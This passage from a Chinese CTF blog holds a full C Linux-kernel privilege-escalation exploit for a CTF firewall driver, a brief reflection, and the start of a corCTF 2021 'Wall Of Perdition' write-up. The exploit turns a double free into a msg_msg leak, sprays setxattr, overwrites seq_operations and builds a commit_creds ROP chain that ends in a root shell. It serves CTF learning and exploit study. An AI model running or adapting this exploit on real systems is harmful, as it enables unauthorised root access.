0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;user_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> msg_id[<span class="number">3</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> <span class="built_in">queue</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernelbase=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> page_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_task=<span class="number">0</span>,prev_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">pthread_t</span> td[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> is_write_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_obj=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> seq_fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0x108_pop_3=<span class="number">0xffffffff81019d8b</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret=<span class="number">0xffffffff8102af06</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_cred=<span class="number">0xffffffff8106f870</span>;</span><br><span class="line"><span class="keyword">size_t</span> kpti_addr=<span class="number">0xffffffff81600df0</span>+<span class="number">0x10</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret=<span class="number">0xffffffff810001dc</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;exp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;31m %s\e[0m\n&quot;</span>,err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%d.%d.%d.%d\n&quot;,(ip&amp;0xff),(ip&amp;0x0000ff00)&gt;&gt;8,(ip&amp;0x00ff0000)&gt;&gt;16,(ip&amp;0xff000000)&gt;&gt;24);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="comment">// if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//     err_exit(&quot;add fail&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    user_msg *msg=(user_msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">10</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        add_rule(fd,i,INBOUND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x64</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">4</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x65</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1008</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] doublefree\n&quot;</span>);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,OUTBOUND);</span><br><span class="line">    msg_header *fake_msg_header=(msg_header *)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    fake_msg_header-&gt;ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1050</span>;</span><br><span class="line">    fake_msg_header-&gt;next=page_msg<span class="number">-0x10</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1050</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;cccccccccccccccc&quot;</span>,<span class="number">0x10</span>))&#123;</span><br><span class="line">            target_obj=re_buf[i<span class="number">-2</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m target_obj_addr:%p \e[0m\n&quot;</span>,target_obj);</span><br><span class="line"></span><br><span class="line">    fake_msg_header-&gt;ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x10</span>;</span><br><span class="line">    fake_msg_header-&gt;next=target_obj;</span><br><span class="line">    fake_msg_header-&gt;security=<span class="number">0</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">2</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1008</span>,<span class="number">4</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">3</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">1</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(tmp&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> seq_operation[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    add_rsp_0x108_pop_3=add_rsp_0x108_pop_3-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    pop_rdi_ret=pop_rdi_ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    commit_cred=commit_cred-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    kpti_addr=kpti_addr-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    ret=ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line"></span><br><span class="line">    seq_operation[<span class="number">0</span>]=<span class="number">0xffffffff81019d8b</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;seq&quot;</span>, seq_operation, <span class="number">0x20</span>, <span class="number">0</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9,  kpti_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,  0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h2><p>于利用的意义就是可以有这样的通解了，以后低版本doublefree可以一把梭了，于我的意义就是终于不是看着别人wp复现出来的了，而是自己按照自己思路并且成功提权的内核利用。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/16/corCTF-2021-Wall-Of-Perdition-msg%E7%AC%AC%E4%BA%8C%E5%BC%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/16/corCTF-2021-Wall-Of-Perdition-msg%E7%AC%AC%E4%BA%8C%E5%BC%B9/" class="post-title-link" itemprop="url">corCTF 2021 Wall Of Perdition&msg第二弹</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-11-16 21:18:18" itemprop="dateCreated datePublished" datetime="2022-11-16T21:18:18+08:00">2022-11-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-11-17 22:03:57" itemprop="dateModified" datetime="2022-11-17T22:03:57+08:00">2022-11-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>msg在许多内核cve中都有使用，所以利用这道题再加深一下对msg的理解，然后看看能不能复现个内核cve。</p>
<p>这个是corctf2021内核题的困难模式，简单模式是0x1000的object利用，困难模式是0x40的object利用。比之0x1000的利用确实麻烦很多，在0x1000的object利用中，如果控制了msg的前0x28个字节的话，就可以直接利用msg的<code>m_ts</code>和<code>next</code>完成内核地址的泄露以及配合<code>userfault</code>的任意地址写。</p>
<p>在0x40的利用中，泄露地址和0x1000并没有什么特别的地方，主要的差别出现在了任意地址写上面,其中利用msg进行任意地址写的内核代码如下,就算能够修改msg.next,但是写的长度早已经被记录到了len变量中，所以向next写值的时候相当于执行了<code>copy_from_user(seg + 1, src, 0)</code>,就没有向next中写值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = 